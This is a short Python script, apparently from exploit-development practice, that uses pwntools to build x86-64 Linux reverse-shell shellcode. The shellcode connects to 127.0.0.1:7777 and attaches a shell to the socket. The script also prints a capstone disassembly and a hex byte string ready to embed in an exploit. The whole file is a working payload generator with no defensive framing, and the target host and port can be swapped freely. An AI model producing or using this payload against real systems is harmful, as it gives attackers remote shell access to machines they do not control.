#!/usr/bin/python3

from pwn import * 
context(arch="amd64", os="linux") 

sc = asm(shellcraft.amd64.linux.connect(host='127.0.0.1',port=7777))
sc += asm(pwnlib.shellcraft.amd64.linux.dupsh(sock='rbp'))

print("-------------- Shellcode Disassembly ----------------------")
from capstone import * 
md = Cs(CS_ARCH_X86, CS_MODE_64) 
for i in md.disasm(sc, 0x1000):
  print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))


print("-------------- Shellcode String ---------------------------")
printable_sc = ''
for b in sc:
    printable_sc = printable_sc + str(hex(b))+', '

printable_sc=printable_sc.rstrip(', ')
print(printable_sc)

print("\nshellcode = %i total bytes" %len(sc)) 


